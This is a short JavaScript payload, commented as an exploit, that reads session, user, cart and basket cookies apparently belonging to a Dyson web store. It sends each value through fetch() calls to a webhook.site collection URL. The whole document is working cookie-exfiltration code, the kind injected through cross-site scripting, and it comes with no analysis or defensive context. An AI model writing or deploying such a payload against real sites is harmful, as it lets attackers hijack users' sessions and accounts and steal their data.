// Exploit: Send all cookie values one by one to attacker

fetch("https://webhook.site/a48f080a-d4fb-4be8-b747-ba66ffbba412/user_id=" + encodeURIComponent(getCookie("dyson_user_id")));
fetch("https://webhook.site/a48f080a-d4fb-4be8-b747-ba66ffbba412/session_id=" + encodeURIComponent(getCookie("dyson_session_id")));
fetch("https://webhook.site/a48f080a-d4fb-4be8-b747-ba66ffbba412/cart_id=" + encodeURIComponent(getCookie("dyson_cart_id")));
fetch("https://webhook.site/a48f080a-d4fb-4be8-b747-ba66ffbba412/basket=" + encodeURIComponent(getCookie("_dyson_basket_view")));

function getCookie(name) {
  return (document.cookie.split('; ').find(row => row.startsWith(name + '=')) || '').split('=')[1];
}
